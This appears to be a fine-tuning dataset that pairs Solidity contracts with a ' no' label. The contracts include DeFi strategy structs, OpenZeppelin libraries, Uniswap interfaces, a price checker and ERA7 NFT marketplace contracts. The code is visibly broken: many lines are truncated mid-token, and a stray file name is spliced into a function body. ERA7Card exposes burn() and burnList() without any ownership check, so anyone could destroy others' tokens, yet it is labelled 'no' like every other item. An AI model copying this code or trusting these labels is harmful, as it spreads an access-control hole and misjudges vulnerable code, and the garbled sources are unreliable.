{"prompt": "pragma solidity 0.6.12; \n \n \n \ncontract StrategyV2Data { \n \n // Info of each user. \n struct UserInfo { \n uint256 lpAmount; // deposit lptoken amount \n uint256 lpPoints; // deposit proportion \n address[] borrowFrom; // borrowFrom \n uint256[] bids; \n } \n \n // Info of each pool. \n struct PoolInfo { \n address[] collateralToken; // collateral Token list, last must be baseToken \n address baseToken; // baseToken can be borrowed \n address lpToken; // lptoken to deposit \n uint256 poolId; // poolid for mdex pools \n uint256 lastRewardsBlock; // \n uint256 totalPoints; // total of user lpPoints \n uint256 totalLPAmount; // total of user lpAmount \n uint256 totalLPReinvest; // total of lptoken amount with totalLPAmount and reinvest re\n uint256 miniRewardAmount; // \n } \n \n // Info of each pool. \n PoolInfo[] public poolInfo; \n // Info of each user that stakes LP tokens. \n mapping (uint256 => mapping (address => UserInfo)) public userInfo2; \n \n address public _bank; // address of bank \n address public _this; \n address public helperImpl; \n \n IStrategyConfig public sconfig; \n mapping (uint256 => mapping (string => uint256)) public poolConfig; \n \n IStrategyV2SwapPool public swapPoolImpl; \n \n address public devAddr; \n IPriceChecker public priceChecker; \n IActionPools public compActionPool; // address of comp action pool \n \n mapping(address=>bool) public whitelist; \n uint256[39] private __gap; \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \ninterface IStrategyV2Pair is IStrategyLink { \n \n event AddPool(uint256 _pid, uint256 _poolId, address lpToken, address _baseToken); \n event SetMiniRewardAmount(uint256 _pid, uint256 _miniRewardAmount); \n event SetPoolImpl(address _oldv, address _new); \n event SetComponents(address _compActionPool, address _buyback, address _priceChecker, address _co\n event SetPoolConfig(uint256 _pid, string _key, uint256 _value); \n \n event StrategyBorrow2(address indexed strategy, uint256 indexed pid, address user, address indexe\n event StrategyRepayBorrow2(address indexed strategy, uint256 indexed pid, address user, address i\n event StrategyLiquidation2(address indexed strategy, uint256 indexed pid, address user, uint256 l\n \n function getBorrowInfo(uint256 _pid, address _account, uint256 _bindex) \n external view returns (address borrowFrom, uint256 bid, uint256 amount); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IRewardsToken { \n function mint(address _account, uint256 _amount) external; \n function burn(uint256 _amount) external; \n \n function setMintWhitelist(address _account, bool _enabled) external; \n function checkWhitelist(address _account) external view returns (bool); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \n/** \n * @title SafeERC20 \n * @dev Wrappers around ERC20 operations that throw on failure (when the token \n * contract returns false). Tokens that return no value (and instead revert or \n * throw on failure) are also supported, non-reverting calls are assumed to be \n * successful. \n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract, \n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc. \n */ \nlibrary SafeERC20 { \n using SafeMath for uint256; \n using Address for address; \n \n function safeTransfer(IERC20 token, address to, uint256 value) internal { \n _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value)); \n } \n \n function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal { \n _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, valu\n } \n \n /** \n * @dev Deprecated. This function has issues similar to the ones found in \n * {IERC20-approve}, and its usage is discouraged. \n * \n * Whenever possible, use {safeIncreaseAllowance} and \n * {safeDecreaseAllowance} instead. \n */ \n function safeApprove(IERC20 token, address spender, uint256 value) internal { \n // safeApprove should only be called when setting an initial allowance, \n // or when resetting it to zero. To increase and decrease it, use \n // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' \n // solhint-disable-next-line max-line-length \n require((value == 0) || (token.allowance(address(this), spender) == 0), \n \"SafeERC20: approve from non-zero to non-zero allowance\" \n ); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); \n } \n \n function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal { \n uint256 newAllowance = token.allowance(address(this), spender).add(value); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal { \n uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreas\n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n /** \n * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxin\n * on the return value: the return value is optional (but if data is returned, it must not be fal\n * @param token The token targeted by the call. \n * @param data The call data (encoded using abi.encode or one of its variants). \n */ \n function _callOptionalReturn(IERC20 token, bytes memory data) private { \n // We need to perform a low level call here, to bypass Solidity's return data size checking m\n // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which \n // the target address contains contract code and also asserts for success in the low-level ca\n \n bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\n if (returndata.length > 0) { // Return data is optional \n // solhint-disable-next-line max-line-length \n require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\"); \n } \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @title SignedSafeMath \n * @dev Signed math operations with safety checks that revert on error. \n */ \nlibrary SignedSafeMathUpgradeable { \n int256 constant private _INT256_MIN = -2**255; \n \n /** \n * @dev Returns the multiplication of two signed integers, reverting on \n * overflow. \n * \n * Counterpart to Solidity's `*` operator. \n * \n * Requirements: \n * \n * - Multiplication cannot overflow. \n */ \n function mul(int256 a, int256 b) internal pure returns (int256) { \n // Gas optimization: this is cheaper than requiring 'a' not being zero, but the \n // benefit is lost if 'b' is also tested. \n // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522 \n if (a == 0) { \n return 0; \n } \n \n require(!(a == -1 && b == _INT256_MIN), \"SignedSafeMath: multiplication overflow\"); \n \n int256 c = a * b; \n require(c / a == b, \"SignedSafeMath: multiplication overflow\"); \n \n return c; \n } \n \n /** \n * @dev Returns the integer division of two signed integers. Reverts on \n * division by zero. The result is rounded towards zero. \n * \n * Counterpart to Solidity's `/` operator. Note: this function uses a \n * `revert` opcode (which leaves remaining gas untouched) while Solidity \n * uses an invalid opcode to revert (consuming all remaining gas). \n * \n * Requirements: \n * \n * - The divisor cannot be zero. \n */ \n function div(int256 a, int256 b) internal pure returns (int256) { \n require(b != 0, \"SignedSafeMath: division by zero\"); \n require(!(b == -1 && a == _INT256_MIN), \"SignedSafeMath: division overflow\"); \n \n int256 c = a / b; \n \n return c; \n } \n \n /** \n * @dev Returns the subtraction of two signed integers, reverting on \n * overflow. \n * \n * Counterpart to Solidity's `-` operator. \n * \n * Requirements: \n * \n * - Subtraction cannot overflow. \n */ \n function sub(int256 a, int256 b) internal pure returns (int256) { \n int256 c = a - b; \n require((b >= 0 && c <= a) || (b < 0 && c > a), \"SignedSafeMath: subtraction overflow\"); \n \n return c; \n } \n \n /** \n * @dev Returns the addition of two signed integers, reverting on \n * overflow. \n * \n * Counterpart to Solidity's `+` operator. \n * \n * Requirements: \n * \n * - Addition cannot overflow. \n */ \n function add(int256 a, int256 b) internal pure returns (int256) { \n int256 c = a + b; \n require((b >= 0 && c >= a) || (b < 0 && c < a), \"SignedSafeMath: addition overflow\"); \n \n return c; \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface IUniswapV2Pair { \n event Approval(address indexed owner, address indexed spender, uint value); \n event Transfer(address indexed from, address indexed to, uint value); \n \n function name() external pure returns (string memory); \n function symbol() external pure returns (string memory); \n function decimals() external pure returns (uint8); \n function totalSupply() external view returns (uint); \n function balanceOf(address owner) external view returns (uint); \n function allowance(address owner, address spender) external view returns (uint); \n \n function approve(address spender, uint value) external returns (bool); \n function transfer(address to, uint value) external returns (bool); \n function transferFrom(address from, address to, uint value) external returns (bool); \n \n function DOMAIN_SEPARATOR() external view returns (bytes32); \n function PERMIT_TYPEHASH() external pure returns (bytes32); \n function nonces(address owner) external view returns (uint); \n \n function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, by\n \n event Mint(address indexed sender, uint amount0, uint amount1); \n event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); \n event Swap( \n address indexed sender, \n uint amount0In, \n uint amount1In, \n uint amount0Out, \n uint amount1Out, \n address indexed to \n ); \n event Sync(uint112 reserve0, uint112 reserve1); \n \n function MINIMUM_LIQUIDITY() external pure returns (uint); \n function factory() external view returns (address); \n function token0() external view returns (address); \n function token1() external view returns (address); \n function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTim\n function price0CumulativeLast() external view returns (uint); \n function price1CumulativeLast() external view returns (uint); \n function kLast() external view returns (uint); \n \n function mint(address to) external returns (uint liquidity); \n function burn(address to) external returns (uint amount0, uint amount1); \n function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; \n function skim(address to) external; \n function sync() external; \n \n function initialize(address, address) external; \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \n \n \ncontract PriceCheckerLPToken is OwnableUpgradeable, IPriceChecker { \n using SafeMathUpgradeable for uint256; \n using SignedSafeMathUpgradeable for int256; \n \n mapping(address => uint256) public priceSlippage; \n ITokenOracle public tokenOracle; \n uint256 public largeSlipRate; \n \n event SetPriceSlippage(address _lptoken, uint256 _oldv, uint256 _newv); \n event SetLargeSlipRate(uint256 _oldv, uint256 _newv); \n event SetTokenOracle(address _oldv, address _newv); \n \n constructor() public { \n } \n \n function initialize(address _tokenOracle) public initializer { \n __Ownable_init(); \n largeSlipRate = 4e9; \n setTokenOracle(_tokenOracle); \n } \n \n function setLargeSlipRate(uint256 _largeSlipRate) external onlyOwner { \n require(_largeSlipRate >= 1e9, 'value error'); \n emit SetLargeSlipRate(largeSlipRate, _largeSlipRate); \n largeSlipRate = _largeSlipRate; \n } \n \n function setPriceSlippage(address _lptoken, uint256 _slippage) external onlyOwner { \n require(_slippage >= 0 && _slippage <= 1e9, 'value error'); \n emit SetPriceSlippage(_lptoken, priceSlippage[_lptoken], _slippage); \n priceSlippage[_lptoken] = _slippage; \n } \n \n function setTokenOracle(address _tokenOracle) public onlyOwner { \n emit SetTokenOracle(address(tokenOracle), _tokenOracle); \n tokenOracle = ITokenOracle(_tokenOracle); \nActionCompPools::TransparentUpgradeableProxy.sol\n } \n \n function getPriceSlippage(address _lptoken) public override view returns (uint256) { \n if(priceSlippage[_lptoken] > 0) { \n return priceSlippage[_lptoken]; \n } \n return uint256(1e7); \n } \n \n function getLPTokenPriceInMdex(address _lptoken, address _t0, address _t1) public view returns (u\n IUniswapV2Pair pair = IUniswapV2Pair(_lptoken); \n (uint256 r0, uint256 r1, ) = pair.getReserves(); \n uint256 d0 = ERC20Upgradeable(_t0).decimals(); \n uint256 d1 = ERC20Upgradeable(_t1).decimals(); \n if(d0 != 18) { \n r0 = r0.mul(1e18).div(10**d0); \n } \n if(d1 != 18) { \n r1 = r1.mul(1e18).div(10**d1); \n } \n return r0.mul(1e18).div(r1); \n } \n \n \n function getLPTokenPriceInOracle(address _t0, address _t1) public view returns (uint256) { \n int256 price0 = tokenOracle.getPrice(_t0); \n int256 price1 = tokenOracle.getPrice(_t1); \n if(price0 <= 0 || price1 <= 0) { \n return 0; \n } \n int256 priceInOracle = price1.mul(1e18).div(price0); \n if(priceInOracle <= 0) { \n return 0; \n } \n return uint256(priceInOracle); \n } \n \n function checkLPTokenPriceLimit(address _lptoken, bool _largeType) external override view returns\n IUniswapV2Pair pair = IUniswapV2Pair(_lptoken); \n address t0 = pair.token0(); \n address t1 = pair.token1(); \n uint256 price0 = getLPTokenPriceInMdex(_lptoken, t0, t1); \n uint256 price1 = getLPTokenPriceInOracle(t0, t1); \n if(price0 == 0 || price1 == 0) { \n return false; \n } \n uint256 slip = getPriceSlippage(_lptoken); \n uint256 priceRate = price0.mul(1e9).div(price1); \n if(_largeType) { \n slip = slip.mul(largeSlipRate).div(1e9); \n } \n if(priceRate >= uint256(1e9).add(slip) || priceRate <= uint256(1e9).sub(slip)) { \n return false; \n } \n return true; \n } \n}\n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.2; \n \ninterface IUniswapV2Router01 { \n function factory() external pure returns (address); \n function WHT() external pure returns (address); \n \n function addLiquidity( \n address tokenA, \n address tokenB, \n uint amountADesired, \n uint amountBDesired, \n uint amountAMin, \n uint amountBMin, \n address to, \n uint deadline \n ) external returns (uint amountA, uint amountB, uint liquidity); \n function addLiquidityHT( \n address token, \n uint amountTokenDesired, \n uint amountTokenMin, \n uint amountHTMin, \n address to, \n uint deadline \n ) external payable returns (uint amountToken, uint amountHT, uint liquidity); \n function removeLiquidity( \n address tokenA, \n address tokenB, \n uint liquidity, \n uint amountAMin, \n uint amountBMin, \n address to, \n uint deadline \n ) external returns (uint amountA, uint amountB); \n function removeLiquidityHT( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountHTMin, \n address to, \n uint deadline \n ) external returns (uint amountToken, uint amountHT); \n function removeLiquidityWithPermit( \n address tokenA, \n address tokenB, \n uint liquidity, \n uint amountAMin, \n uint amountBMin, \n address to, \n uint deadline, \n bool approveMax, uint8 v, bytes32 r, bytes32 s \n ) external returns (uint amountA, uint amountB); \n function removeLiquidityHTWithPermit( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountHTMin, \n address to, \n uint deadline, \n bool approveMax, uint8 v, bytes32 r, bytes32 s \n ) external returns (uint amountToken, uint amountHT); \n function swapExactTokensForTokens( \n uint amountIn, \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external returns (uint[] memory amounts); \n function swapTokensForExactTokens( \n uint amountOut, \n uint amountInMax, \n address[] calldata path, \n address to, \n uint deadline \n ) external returns (uint[] memory amounts); \n function swapExactHTForTokens(uint amountOutMin, address[] calldata path, address to, uint deadli\n external \n payable \n returns (uint[] memory amounts); \n function swapTokensForExactHT(uint amountOut, uint amountInMax, address[] calldata path, address \n external \n returns (uint[] memory amounts); \n function swapExactTokensForHT(uint amountIn, uint amountOutMin, address[] calldata path, address \n external \n returns (uint[] memory amounts); \n function swapHTForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n external \n payable \n returns (uint[] memory amounts); \n \n function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB); \n function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint \n function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint \n function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memo\n function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memo\n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.2; \n \n \ninterface IUniswapV2Router02 is IUniswapV2Router01 { \n function removeLiquidityHTSupportingFeeOnTransferTokens( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountHTMin, \n address to, \n uint deadline \n ) external returns (uint amountHT); \n function removeLiquidityHTWithPermitSupportingFeeOnTransferTokens( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountHTMin, \n address to, \n uint deadline, \n bool approveMax, uint8 v, bytes32 r, bytes32 s \n ) external returns (uint amountHT); \n \n function swapExactTokensForTokensSupportingFeeOnTransferTokens( \n uint amountIn, \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external; \n function swapExactHTForTokensSupportingFeeOnTransferTokens( \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external payable; \n function swapExactTokensForHTSupportingFeeOnTransferTokens( \n uint amountIn, \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external; \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface IUniswapV2Factory { \n event PairCreated(address indexed token0, address indexed token1, address pair, uint); \n \n function feeTo() external view returns (address); \n function feeToSetter() external view returns (address); \n function migrator() external view returns (address); \n \n function getPair(address tokenA, address tokenB) external view returns (address pair); \n function allPairs(uint) external view returns (address pair); \n function allPairsLength() external view returns (uint); \n \n function createPair(address tokenA, address tokenB) external returns (address pair); \n \n function setFeeTo(address) external; \n function setFeeToSetter(address) external; \n function setMigrator(address) external; \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0 <0.8.0; \n \ninterface ICherryPool { \n function cherry() external view returns (address); \n \n function poolLength() external view returns (uint256); \n \n function poolInfo(uint256 _pid) external view returns(address _lpToken, uint256, uint256); \n \n function userInfo(uint256 _pid, address _user) external view returns (uint256 _amount, uint256 _r\n \n function deposit(uint256 _pid, uint256 _amount) external; \n \n function pendingCherry(uint256 _pid, address _user) external view returns (uint256); \n \n function withdraw(uint256 _pid, uint256 _amount) external; \n \n function emergencyWithdraw(uint256 _pid) external; \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\"; \nimport \"@openzeppelin/contracts/utils/Counters.sol\"; \nimport \"./comm/Helper.sol\"; \n \ncontract ERA7Card is ERC721,Helper { \n \n struct ERA7CardEntity { \n uint256 tokenId; \n uint id; \n uint ct; \n } \n \n ERA7CardEntity[] public allCards; \n mapping(address => uint256[]) public playerCards; \n mapping(address => mapping(uint256 => uint)) public playerCardIndexs; \n \n using Counters for Counters.Counter; \n Counters.Counter private _tokenIds; \n \n constructor() ERC721(\"Era7 NFT\", \"ERANFT\") {} \n \n function awardCard(address player,uint cardId) external onlyHelper returns (uint256){ \n _tokenIds.increment(); \n \n uint256 newItemId = _tokenIds.current(); \n \n ERA7CardEntity memory card = ERA7CardEntity(newItemId,cardId,block.timestamp); \n allCards.push(card); \n \n playerCards[player].push(newItemId); \n playerCardIndexs[player][newItemId] = playerCards[player].length; \n \n _mint(player, newItemId); \n \n emit AwardCard(player,newItemId,cardId); \n \n return newItemId; \n } \n \n function approveList(address to, uint256[] memory tokenIds) external { \n uint len = tokenIds.length; \n for(uint i = 0; i < len ; i++){ \n approve(to, tokenIds[i]); \n } \n } \n \n function _transfer(address from,address to,uint256 tokenId) internal virtual override { \n super._transfer(from,to,tokenId); \n _swapTokenOwner(from,to,tokenId); \n } \n \n function burnList(uint256[] memory tokenIds) external { \n uint len = tokenIds.length; \n for(uint i = 0; i < len ; i++){ \n _burn(tokenIds[i]); \n } \n } \n \n function burn(uint256 tokenId) external { \n _burn(tokenId); \n } \n \n function _burn(uint256 tokenId) internal virtual override { \n address owner = ERC721.ownerOf(tokenId); \n _swapTokenOwner(owner,address(0),tokenId); \n super._burn(tokenId); \n } \n \n function _swapTokenOwner(address from,address to,uint256 tokenId) private{ \n if(from != to){ \n uint index = playerCardIndexs[from][tokenId]; \n if(playerCards[from].length != index){ \n uint256 oldToken = playerCards[from][playerCards[from].length - 1]; \n playerCards[from][index - 1] = oldToken; \n playerCardIndexs[from][oldToken] = index; \n } \n playerCards[from].pop(); \n delete playerCardIndexs[from][tokenId]; \n \n if(to != address(0)){ \n playerCards[to].push(tokenId); \n playerCardIndexs[to][tokenId] = playerCards[to].length; \n } \n } \n } \n \n function totalCard() external view returns(uint256) { \n return allCards.length; \n } \n \n function getPlayerCards(address player) external view returns (ERA7CardEntity[] memory) { \n uint[] memory list = playerCards[player]; \n uint length = list.length; \n ERA7CardEntity[] memory cardList = new ERA7CardEntity[](length); \n for(uint i = 0; i < length ; i++){ \n cardList[i] = allCards[list[i] - 1]; \n } \n return cardList; \n } \n \n event AwardCard(address indexed to, uint256 nftId,uint256 cardId); \n} \n// nft\u4ea4\u6613\u5e02\u573a \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; \nimport \"./comm/SafeMath.sol\"; \nimport \"./comm/Helper.sol\"; \nimport \"./IERA7Card.sol\"; \n \ncontract ERA7CardMarketPlace is Helper { \n \n address public coin; \n address public nft; \n \n uint256[] public sellingNfts; \n mapping(uint256 => uint256) public sellingNftIndexs; \n \n struct MarketPlaceNftInfo{ \n uint256 tokenId; \n uint price; \n address owner; \n uint upTime; \n } \n mapping(uint256 => MarketPlaceNftInfo) public nftMap; \n \n constructor() {} \n \n function initAddress(address coin_,address nft_) external onlyHelper { \n require((coin_ != address(0) && nft_ != address(0)), \"ERA7CardMarketPlace initAddress: address er\n \n coin = coin_; \n nft = nft_; \n } \n \n function withdraw(address taxWallet) external onlyHelper returns(bool){ \n require(taxWallet != address(0), \"ERA7CardMarketPlace withdraw: taxWallet error\"); \n \n uint256 val = IERC20(coin).balanceOf(address(this)); \n require(val > 0, \"ERA7CardMarketPlace withdraw: val error\"); \n \n IERC20(coin).transfer(taxWallet,val); \n return true; \n } \n \n function uploadNft(uint256 nftId,uint256 price) external nonReentrant isPause{ \n address ownerAddress = IERA7Card(nft).ownerOf(nftId); \n address uploadAddress = _msgSender(); \n require(ownerAddress == uploadAddress, \"ERA7CardMarketPlace uploadNft: not owner\"); \n require(price > 10000, \"ERA7CardMarketPlace uploadNft: price error\"); \n \n uint index = sellingNftIndexs[nftId]; \n if(index == 0){ \n MarketPlaceNftInfo memory newInfo = MarketPlaceNftInfo(nftId,price,ownerAddress,block.timesta\n nftMap[nftId] = newInfo; \n sellingNfts.push(nftId); \n sellingNftIndexs[nftId] = sellingNfts.length; \n }else{ \n MarketPlaceNftInfo storage oldInfo = nftMap[nftId]; \n oldInfo.price = price; \n oldInfo.upTime = block.timestamp; \n } \n \n emit UploadNft(ownerAddress,nftId,price); \n } \n \n function stopSell(uint256 nftId) external nonReentrant isPause{ \n uint index = sellingNftIndexs[nftId]; \n require(index > 0, \"ERA7CardMarketPlace stopSell: nftId error\"); \n \n address ownerAddress = IERA7Card(nft).ownerOf(nftId); \n require(ownerAddress == _msgSender(), \"ERA7CardMarketPlace stopSell: stop error\"); \n \n _removeNftFromList(nftId); \n \n emit StopSell(nftId); \n } \n \n function _removeNftFromList(uint256 nftId) private{ \n uint index = sellingNftIndexs[nftId]; \n if(sellingNfts.length != index){ \n uint oldNftId = sellingNfts[sellingNfts.length - 1]; \n sellingNfts[index - 1] = oldNftId; \n sellingNftIndexs[oldNftId] = index; \n } \n sellingNfts.pop(); \n delete sellingNftIndexs[nftId]; \n delete nftMap[nftId]; \n } \n \n function getTotalNft() external view returns(uint){ \n return sellingNfts.length; \n } \n \n function getSellList(uint start,uint end) external view returns(MarketPlaceNftInfo[] memory){ \n require(start >= 0 && end >= start,\"ERA7CardMarketPlace getSellList:params error\"); \n \n uint total = sellingNfts.length; \n if(total == 0){ \n return new MarketPlaceNftInfo[](0); \n } \n if(start >= total){ \n start = total - 1; \n } \n if(end >= total){ \n end = total - 1; \n } \n uint size = end - start; \n require(size <= 100,\"ERA7CardMarketPlace getSellList:size error\"); \n \n MarketPlaceNftInfo[] memory list = new MarketPlaceNftInfo[](size + 1); \n for(uint i = start; i <= end ; i++){ \n list[i - start] = nftMap[sellingNfts[i]]; \n } \n return list; \n } \n \n function buy(uint256 nftId) external nonReentrant isPause { \n MarketPlaceNftInfo memory info = nftMap[nftId]; \n require(info.tokenId > 0, \"ERA7CardMarketPlace buy: nftId error\"); \n \n address ownerAddress = IERA7Card(nft).ownerOf(nftId); \n require(ownerAddress == info.owner, \"ERA7CardMarketPlace buy: nftId owner change\"); \n \n SafeERC20.safeTransferFrom(IERC20(coin),_msgSender(),address(this),info.price); \n IERA7Card(nft).transferFrom(info.owner,address(this),nftId); \n \n uint256 get = SafeMath.mul(SafeMath.div(info.price,100),95); \n SafeERC20.safeTransfer(IERC20(coin),info.owner,get); \n IERA7Card(nft).transferFrom(address(this),_msgSender(),nftId); \n \n _removeNftFromList(nftId); \n \n emit Buy(info.owner,_msgSender(),info.tokenId,info.price); \n } \n \n event UploadNft(address indexed from, uint256 nftId,uint256 price); \n event StopSell(uint256 nftId); \n event Buy(address indexed from, address indexed to, uint256 nftId,uint256 price); \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n} \n// Nft \u9884\u552e\u5408\u7ea6 \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; \nimport \"./comm/Helper.sol\"; \nimport \"./IERA7Card.sol\"; \n \ncontract ERA7CardPreSale is Helper { \n \n address public coin; \n address public nft; \n \n struct PreSaleNftInfo{ \n uint cardId; \n uint price; \n uint count; \n } \n \n uint[] public sellingNfts; \n mapping(uint => uint) public sellingNftIndexs; \n mapping(uint => PreSaleNftInfo) public sellingInfos; \n \n constructor() {} \n \n function initAddress(address coin_,address nft_) external onlyHelper { \n require((coin_ != address(0) && nft_ != address(0)), \"ERA7CardPreSale initAddress: address error\"\n \n coin = coin_; \n nft = nft_; \n } \n \n function withdraw(address taxWallet) external onlyHelper returns(bool){ \n require(taxWallet != address(0), \"ERA7CardPreSale withdraw: taxWallet error\"); \n \n uint256 val = IERC20(coin).balanceOf(address(this)); \n require(val > 0, \"ERA7CardPreSale withdraw: val error\"); \n \n IERC20(coin).transfer(taxWallet,val); \n return true; \n } \n \n function uploadNft(uint cardId,uint256 price,uint count) external onlyHelper{ \n require(cardId > 0 && price > 0 && count > 0, \"ERA7CardPreSale uploadNft: params error\"); \n \n uint index = sellingNftIndexs[cardId]; \n if(index == 0){ \n PreSaleNftInfo memory newInfo = PreSaleNftInfo(cardId,price,count); \n sellingInfos[cardId] = newInfo; \n sellingNfts.push(cardId); \n sellingNftIndexs[cardId] = sellingNfts.length; \n }else{ \n PreSaleNftInfo storage oldInfo = sellingInfos[cardId]; \n oldInfo.price = price; \n oldInfo.count = count; \n } \n } \n \n function stopSell(uint cardId) external onlyHelper{ \n PreSaleNftInfo storage info = sellingInfos[cardId]; \n require(info.cardId > 0, \"ERA7CardPreSale stopSell: cardId error\"); \n \n uint index = sellingNftIndexs[cardId]; \n if(sellingNfts.length != index){ \n uint oldCardId = sellingNfts[sellingNfts.length - 1]; \n sellingNfts[index - 1] = oldCardId; \n sellingNftIndexs[oldCardId] = index; \n } \n sellingNfts.pop(); \n delete sellingNftIndexs[cardId]; \n delete sellingInfos[cardId]; \n } \n \n function getSellList() external view returns(PreSaleNftInfo[] memory){ \n uint len = sellingNfts.length; \n PreSaleNftInfo[] memory list = new PreSaleNftInfo[](len); \n for(uint i = 0; i < len ;i++){ \n list[i] = sellingInfos[sellingNfts[i]]; \n } \n return list; \n } \n \n function buy(uint cardId) external nonReentrant returns(uint256){ \n PreSaleNftInfo storage info = sellingInfos[cardId]; \n require(info.cardId > 0, \"ERA7CardPreSale buy: cardId error\"); \n \n uint count = info.count; \n require(count > 0, \"ERA7CardPreSale buy: count error\"); \n info.count--; \n \n address buyAddress = _msgSender(); \n SafeERC20.safeTransferFrom(IERC20(coin),buyAddress,address(this),info.price); \n \n uint256 tokenId = IERA7Card(nft).awardCard(buyAddress,cardId); \n \n emit Buy(_msgSender(),cardId,info.price); \n \n return tokenId; \n } \n \n event Buy(address indexed to, uint256 cardId,uint256 price); \n \n \n \n \n \n \n \n \n \n \n \n \n \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; \nimport \"./comm/SafeMath.sol\"; \nimport \"./comm/Helper.sol\"; \n \ncontract ERA7Token is ERC20,Helper { \n \n uint256 public maxMint; \n \n constructor() ERC20(\"Era Token\", \"ERA\") { \n uint256 decimal = 10 ** uint256(decimals()); \n maxMint = 1000000000 * decimal; \n } \n \n function mint(address to,uint256 amount) external onlyHelper { \n require(to != address(0), \"ERA7Token:to address error\"); \n \n uint256 newVal = SafeMath.add(amount,totalSupply()); \n require(newVal <= maxMint, \"ERA7Token:mint value is max\"); \n _mint(to,amount); \n } \n \n \n function burn(uint256 amount) external { \n _burn(_msgSender(), amount); \n } \n \n function burnFrom(address account, uint256 amount) external { \n uint256 currentAllowance = allowance(account, _msgSender()); \n require(currentAllowance >= amount, \"ERC20: burn amount exceeds allowance\"); \n unchecked { \n _approve(account, _msgSender(), currentAllowance - amount); \n } \n _burn(account, amount); \n } \n \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"@openzeppelin/contracts/access/Ownable.sol\"; \nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\"; \n \ncontract Helper is Ownable,ReentrancyGuard { \n \n address[] public helpers; \n mapping(address => uint) helperIndexs; \n \n bool public pause; \n \n constructor(){ \n pause = false; \n } \n \n function addHelper(address helper) external onlyOwner { \n require(helper != address(0),\"Helper:set helper error\"); \n uint index = helperIndexs[helper]; \n if(index == 0){ \n helpers.push(helper); \n helperIndexs[helper] = helpers.length; \n } \n } \n \n function removeHelper(address helper) external onlyOwner{ \n uint index = helperIndexs[helper]; \n require(index > 0,\"Helper:remove helper error\"); \n if(helpers.length != index){ \n address old = helpers[helpers.length - 1]; \n helpers[index - 1] = old; \n helperIndexs[old] = index; \n } \n helpers.pop(); \n delete helperIndexs[helper]; \n } \n \n function pauseContract() external onlyHelper{ \n pause = true; \n } \n \n function resume() external onlyHelper{ \n pause = false; \n } \n \n modifier onlyHelper() { \n require(helperIndexs[_msgSender()] > 0 || owner() == _msgSender(), \"Helper: caller is not the hel\n _; \n } \n \n modifier isPause() { \n require(!pause, \"Helper: contract is paused\"); \n _; \n } \n \n} \n\n\n###\n\n", "completion": " no###\n###"}
